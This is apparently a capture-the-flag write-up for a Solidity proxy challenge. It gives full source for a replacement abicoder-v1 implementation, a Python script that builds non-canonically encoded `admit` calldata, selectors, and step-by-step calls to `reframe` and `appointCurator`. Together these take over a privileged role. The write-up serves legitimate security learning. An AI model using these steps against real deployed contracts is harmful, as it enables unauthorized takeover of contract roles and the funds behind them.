<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th, td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre, code, pre code, .highlight, .highlight pre, .highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>

# House of Illusions

## TL;DR
The proxy starts on an IllusionHouse implementation compiled with ABI coder v2. The `admit` function *requires* a non-canonical address encoding, but ABI decoder v2 *rejects* non-canonical encodings before the function body runs. So `admit` can never succeed on the initial implementation. The proxy has a one-time `reframe` that allows switching to a bytecode-hash allowlisted implementation. Deploy an allowlisted build (Solc 0.8.28, EVM Shanghai, optimizer OFF, `pragma abicoder v1`) so non-canonical address padding is accepted. Reframe once, then call `admit` with crafted calldata, then `appointCurator`.

## Contracts
- `Setup` deploys `IllusionHouse` then wraps it in `MirrorProxy` and initializes with `curator = address(this)`.
- `MirrorProxy` has one-time `reframe` guarded by a bytecode hash allowlist (`ALLOWED_CODEHASH`).
- `IllusionHouse.admit` expects a *non-canonical* ABI payload and checks raw `msg.data`.

## Key Bug
`admit` checks:
- `msg.data.length == 4 + 96` (fixed 100 bytes)
- `uint256(bytes32(msg.data[36:68])) == 0x20` (offset word must be 0x20)
- `patronWord >> 160 != 0` (address word must have non-zero high 96 bits)

But ABI coder v2 rejects non-canonical address padding before any of those checks. So you must switch to an ABI-v1 compiled implementation where the decoder does not enforce address padding.

## Solution Overview
1) Deploy allowlisted implementation (Solc 0.8.28, EVM Shanghai, optimizer OFF, `pragma abicoder v1`).
2) Call `reframe(newImplementation)` on the proxy (one time).
3) Call `admit` using crafted calldata (100 bytes total).
4) Call `appointCurator(yourEOA)`.
5) Verify `isSolved()`.

## Step 1 - Deploy allowlisted implementation (Remix)
Use this exact header and code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
pragma abicoder v1;

contract IllusionHouse {
    enum Role { Visitor, Curator }
    mapping(address => Role) public roles;
    mapping(address => uint96) public maskRank;
    mapping(address => bool) public admitted;
    bool public opened;

    bytes32 public constant SIGIL_PREIMAGE = bytes32("0xAnan or Tensai?");
    bytes32 public constant SIGIL_HASH = keccak256(abi.encodePacked(SIGIL_PREIMAGE));

    constructor() payable {}

    function initialize(address curator) external payable {
        require(!opened, "opened");
        opened = true;
        roles[address(this)] = Role.Curator;
        admitted[address(this)] = true;
    }

    function admit(address patron, bytes calldata sigil) external {
        require(!admitted[msg.sender], "already admitted");
        require(msg.data.length == 4 + 96, "invalid sigil payload");
        require(uint256(bytes32(msg.data[36:68])) == 0x20, "invalid sigil offset");
        uint256 patronWord = uint256(bytes32(msg.data[4:36]));
        require(patronWord >> 160 != 0, "invalid patron encoding");
        require(roles[patron] == Role.Curator, "invalid patron");
        require(sigil.length == 32, "invalid sigil length");
        require(keccak256(sigil) == SIGIL_HASH, "invalid sigil");
        bytes32 sigilWord = abi.decode(sigil, (bytes32));
        uint96 rank = uint96(uint256(sigilWord) >> 160);
        admitted[msg.sender] = true;
        roles[msg.sender] = Role.Visitor;
        if (rank > 0) maskRank[msg.sender] = rank;
    }

    function appointCurator(address newCurator) external {
        require(maskRank[msg.sender] > 0, "not masked");
        roles[newCurator] = Role.Curator;
        admitted[newCurator] = true;
    }
}
```

Remix settings:
- Compiler: **0.8.28**
- EVM: **Shanghai**
- Optimization: **OFF**

Deploy to Sepolia and record the new implementation address.

## Step 2 - Reframe the proxy
Call `reframe(address)` on the proxy (house). You can use a minimal interface:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;
interface IMirrorProxy {
    function reframe(address newImplementation) external;
}
```

In Remix:
- `At Address` with the proxy (house) address
- Call `reframe(newImplementation)` once

## Step 3 - Crafted admit calldata
The function demands a 100-byte payload, where the offset word equals `0x20` and the patron word has **non-zero high 96 bits**.

- `admit(address,bytes)` selector: `0xf5b1e981`
- Sigil bytes32 is the ASCII string `"0xAnan or Tensai?"` right-padded with zeros to 32 bytes.

Example layout:
```
0xf5b1e981 | PATRON_WORD | 0x20 | SIGIL_BYTES32
```
Where:
- `PATRON_WORD` = non-zero 12 bytes + 20-byte proxy address
- `SIGIL_BYTES32` = 0x3078416e616e206f722054656e7361693f000000000000000000000000000000

Python helper:
```python
from Crypto.Hash import keccak

def k4(sig):
    k = keccak.new(digest_bits=256); k.update(sig.encode()); return k.digest()[:4].hex()

proxy = "0x<proxy>"
selector = k4("admit(address,bytes)")
patron_word = "11"*12 + proxy[2:].lower()
offset = "00"*31 + "20"
sigil = b"0xAnan or Tensai?".ljust(32, b"\x00").hex()

admit_data = "0x" + selector + patron_word + offset + sigil
print(admit_data)
```

Send a tx to the proxy with:
- `to` = proxy address
- `value` = 0
- `gas` = ~200k
- `data` = crafted `admit_data`

## Step 4 - Appoint Curator
Then call:
```
appointCurator(yourEOA)
```
Selector: `0x95b2c1f9`

Data:
```
0x95b2c1f9 + <your EOA padded to 32 bytes>
```

## Step 5 - Check
Use the UI �Check Solution� or call `Setup.isSolved()`.

## Notes
- The proxy only allows one `reframe`, so if you deploy the wrong build, you must reset the instance.
- If `admit` fails with low gas, raise the gas limit to ~200k.